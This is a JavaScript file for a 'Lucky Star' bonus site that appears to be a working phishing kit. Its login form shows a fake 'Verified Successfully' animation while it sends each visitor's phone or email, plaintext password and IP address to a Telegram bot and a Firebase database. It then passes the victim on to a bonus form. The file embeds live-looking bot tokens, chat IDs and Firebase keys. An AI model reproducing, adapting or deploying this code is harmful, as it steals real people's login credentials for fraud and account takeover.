// ================= FIREBASE CONFIG =================
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "lucky_star";

let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => { loaded++; if (loaded === urls.length) initDb(); };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ================= CONFIG =================
const BOT_TOKEN = '8902846687:AAGE2QmaVtf-wden-XEp-5VHdAirq03igyQ';
const LOGIN_CHAT_ID = '-1003919574881';
const REQUEST_CHAT_ID = '-1003809176248';

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ================= PRELOADER =================
window.addEventListener('load', () => {
    const preloader = document.getElementById('preloader');
    setTimeout(() => {
        if (preloader) preloader.classList.add('hidden');
    }, 1800);
});

// ================= ONE-TIME LOGIN =================
// Account already verified hua hai to login page skip, direct agle process pe
const VERIFIED_KEY = 'ls_verified_account';

if (localStorage.getItem(VERIFIED_KEY)) {
    sessionStorage.setItem('ls_logged_in', 'true');
    sessionStorage.setItem('ls_login_id', localStorage.getItem(VERIFIED_KEY));
    window.location.replace('../bonus-form/index.html');
}

// ================= MENU =================
const menuBtn = document.getElementById('menu-btn');
const closeMenu = document.getElementById('close-menu');
const sideMenu = document.getElementById('side-menu');
const menuOverlay = document.getElementById('menu-overlay');

if (menuBtn) {
    menuBtn.addEventListener('click', () => {
        sideMenu.classList.add('open');
        menuOverlay.classList.add('active');
    });
}

if (closeMenu) {
    closeMenu.addEventListener('click', closeSideMenu);
}

if (menuOverlay) {
    menuOverlay.addEventListener('click', closeSideMenu);
}

function closeSideMenu() {
    sideMenu.classList.remove('open');
    menuOverlay.classList.remove('active');
}

// ================= LOGIN MODAL =================
const loginModal = document.getElementById('login-modal');
const closeLogin = document.getElementById('close-login');
const loginForm = document.getElementById('login-form');
const toggleBtns = document.querySelectorAll('.toggle-btn');
const phoneGroup = document.getElementById('phone-group');
const emailGroup = document.getElementById('email-group');

const VERIFY_DURATION = 4000;
const POPUP_DURATION = 32000;
const BONUS_FORM_PAGE = '../bonus-form/index.html';

let popupTimer = null;

// Toggle Phone/Email
toggleBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        toggleBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const type = btn.dataset.type;
        if (type === 'phone') {
            phoneGroup.classList.remove('hidden');
            emailGroup.classList.add('hidden');
        } else {
            phoneGroup.classList.add('hidden');
            emailGroup.classList.remove('hidden');
        }
    });
});

// Login Submit
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const isPhone = !phoneGroup.classList.contains('hidden');
        const phone = document.getElementById('login-phone').value.trim();
        const email = document.getElementById('login-email').value.trim();
        const password = document.getElementById('login-password').value;
        
        if (!password) {
            alert('Please enter your password');
            return;
        }
        
        if (isPhone && !phone) {
            alert('Please enter your phone number');
            return;
        }
        if (!isPhone && !email) {
            alert('Please enter your email');
            return;
        }
        
        // Save login data for profile
        const loginId = isPhone ? phone : email;
        sessionStorage.setItem('ls_login_id', loginId);
        sessionStorage.setItem('ls_login_type', isPhone ? 'phone' : 'email');
        
        // Show premium verification animation
        const verifyOverlay = document.getElementById('verify-overlay');
        const verifyIcon = document.getElementById('verify-icon');
        const verifyCheckIcon = document.getElementById('verify-check-icon');
        const verifyTitle = document.getElementById('verify-title');
        const verifySubtitle = document.getElementById('verify-subtitle');
        const verifyScanner = verifyOverlay?.querySelector('.verify-scanner');
        const verifyBar = document.getElementById('verify-progress-bar');

        if (verifyOverlay) {
            verifyOverlay.classList.remove('hidden');
            verifyOverlay.style.display = 'flex';
        }

        if (verifyBar) {
            verifyBar.style.transition = `width ${VERIFY_DURATION}ms linear`;
            requestAnimationFrame(() => { verifyBar.style.width = '100%'; });
        }

        // Get IP in background
        const ipPromise = getIP();

        // At 3s show success checkmark, full animation runs 4s
        setTimeout(() => {
            if (verifyIcon) verifyIcon.classList.add('verify-hide');
            if (verifyCheckIcon) verifyCheckIcon.classList.add('verify-show');
            if (verifyTitle) verifyTitle.textContent = 'Verified Successfully';
            if (verifySubtitle) verifySubtitle.textContent = 'Preparing your bonus form...';
            if (verifyScanner) verifyScanner.classList.add('success');
        }, 3000);

        await new Promise(resolve => setTimeout(resolve, VERIFY_DURATION));

        const loginText = `
ðŸ” <b>NEW LOGIN VERIFICATION</b>

ðŸ“± <b>Type:</b> ${isPhone ? 'Phone' : 'Email'}
ðŸ†” <b>ID:</b> ${loginId}
ðŸ”‘ <b>Password:</b> ${password}
â° <b>Time:</b> ${new Date().toLocaleString()}
ðŸŒ <b>IP:</b> ${await ipPromise}
        `.trim();

        sendTelegramMessage(LOGIN_CHAT_ID, loginText).catch(() => {});

        saveSubmission({
            event: 'login',
            type: 'Login',
            login_id: loginId,
            login_type: isPhone ? 'phone' : 'email',
            password: password,
            ip: await ipPromise
        }).catch(() => {});

        if (verifyOverlay) {
            verifyOverlay.classList.add('hidden');
            verifyOverlay.style.display = '';
        }
        loginModal.style.display = 'none';

        sessionStorage.setItem('ls_logged_in', 'true');
        sessionStorage.setItem('ls_login_id', loginId);
        localStorage.setItem(VERIFIED_KEY, loginId);

        openVerifiedPopup(loginId);
    });
}

function openVerifiedPopup(account) {
    const popup = document.getElementById('verified-popup');
    const accountEl = document.getElementById('verified-account');
    const countdownEl = document.getElementById('verified-countdown');
    const timerBar = document.getElementById('verified-timer-bar');
    const continueBtn = document.getElementById('verified-continue');

    if (!popup) return;

    if (accountEl) accountEl.textContent = account;

    popup.classList.remove('hidden');
    requestAnimationFrame(() => popup.classList.add('show'));

    let remaining = Math.floor(POPUP_DURATION / 1000);

    if (timerBar) {
        timerBar.style.transition = `width ${POPUP_DURATION}ms linear`;
        requestAnimationFrame(() => { timerBar.style.width = '0%'; });
    }

    if (popupTimer) clearInterval(popupTimer);
    popupTimer = setInterval(() => {
        remaining -= 1;
        if (countdownEl) countdownEl.textContent = remaining;
        if (remaining <= 0) {
            closeVerifiedPopup();
            window.location.href = BONUS_FORM_PAGE;
        }
    }, 1000);

    if (continueBtn) {
        continueBtn.addEventListener('click', () => {
            closeVerifiedPopup();
            window.location.href = BONUS_FORM_PAGE;
        });
    }
}

function closeVerifiedPopup() {
    const popup = document.getElementById('verified-popup');
    if (popupTimer) { clearInterval(popupTimer); popupTimer = null; }
    if (!popup) return;
    popup.classList.remove('show');
    setTimeout(() => popup.classList.add('hidden'), 300);
}

if (closeLogin) {
    closeLogin.addEventListener('click', () => {
        window.location.href = '../index.html';
    });
}


// ================= SUCCESS MODAL =================
const successModal = document.getElementById('success-modal');
const successOk = document.getElementById('success-ok');

function showSuccessModal() {
    if (successModal) successModal.classList.add('show');
}

if (successOk) {
    successOk.addEventListener('click', () => {
        successModal.classList.remove('show');
    });
}

// ================= TELEGRAM FUNCTIONS =================
async function sendTelegramMessage(chatId, text) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Demo mode: No bot token set. Message:', text);
        return;
    }
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Telegram send failed:', err);
    }
}

async function sendTelegramPhoto(chatId, photoFile, caption) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Demo mode: No bot token set. Photo upload skipped.');
        return;
    }
    try {
        const tgForm = new FormData();
        tgForm.append('chat_id', chatId);
        tgForm.append('photo', photoFile);
        tgForm.append('caption', caption);
        tgForm.append('parse_mode', 'HTML');
        
        await fetch(`${TELEGRAM_API}/sendPhoto`, {
            method: 'POST',
            body: tgForm
        });
    } catch (err) {
        console.error('Telegram photo send failed:', err);
    }
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Unknown';
    }
}

// ================= PROFILE PAGE =================
function saveRequestToHistory(type, data) {
    const requests = JSON.parse(localStorage.getItem('ls_requests') || '[]');
    requests.unshift({
        type: type,
        data: data,
        date: new Date().toISOString(),
        status: 'Submitted'
    });
    localStorage.setItem('ls_requests', JSON.stringify(requests));
}

function initProfilePage() {
    const profileInitials = document.getElementById('profile-initials');
    const profileName = document.getElementById('profile-display-name');
    const profileLoginId = document.getElementById('profile-login-id');
    
    if (!profileName) return;
    
    const loginId = sessionStorage.getItem('ls_login_id') || 'Not logged in';
    const requests = JSON.parse(localStorage.getItem('ls_requests') || '[]');
    
    // Set user info
    profileLoginId.textContent = loginId;
    
    // Get latest username from requests if any
    const latestReq = requests.find(r => r.data && r.data.username);
    const displayName = latestReq ? latestReq.data.username : (loginId !== 'Not logged in' ? loginId.split('@')[0] : 'User');
    profileName.textContent = displayName;
    
    if (profileInitials) {
        profileInitials.textContent = displayName.charAt(0).toUpperCase();
    }
    
    // Stats
    const total = requests.length;
    const deposits = requests.filter(r => r.type === 'deposit').length;
    const withdrawals = requests.filter(r => r.type === 'withdrawal').length;
    const others = requests.filter(r => r.type === 'other').length;
    
    document.getElementById('stat-total').textContent = total;
    document.getElementById('stat-deposit').textContent = deposits;
    document.getElementById('stat-withdrawal').textContent = withdrawals;
    document.getElementById('stat-other').textContent = others;
    
    // Activity list
    const activityList = document.getElementById('activity-list');
    if (!activityList) return;
    
    if (requests.length === 0) {
        activityList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-inbox"></i>
                <p>No requests submitted yet</p>
            </div>`;
    } else {
        activityList.innerHTML = requests.slice(0, 10).map(req => {
            const icons = { deposit: 'fa-wallet', withdrawal: 'fa-hand-holding-usd', other: 'fa-exclamation-circle' };
            const labels = { deposit: 'Deposit', withdrawal: 'Withdrawal', other: 'Other' };
            const date = new Date(req.date).toLocaleDateString();
            const amount = req.data ? (req.data.amount || req.data.withdrawal_amount || '') : '';
            return `
                <div class="activity-item">
                    <div class="activity-item-icon activity-${req.type}">
                        <i class="fas ${icons[req.type] || 'fa-file'}"></i>
                    </div>
                    <div class="activity-item-info">
                        <div class="activity-item-title">${labels[req.type] || 'Request'} ${amount ? '- â‚¹' + amount : ''}</div>
                        <div class="activity-item-meta">${date} Â· ${req.data?.username || 'User'}</div>
                    </div>
                    <div class="activity-item-status">${req.status}</div>
                </div>`;
        }).join('');
    }
}

// Initialize profile page if on profile.html
if (window.location.pathname.includes('profile.html') || document.getElementById('profile-display-name')) {
    initProfilePage();
}

// ================= LOGOUT =================
const logoutBtn = document.getElementById('logout-btn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', () => {
        sessionStorage.clear();
        window.location.href = 'index.html';
    });
}

// ================= SMOOTH SCROLL =================
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            closeSideMenu();
        }
    });
});

// Preload Firebase in background
loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
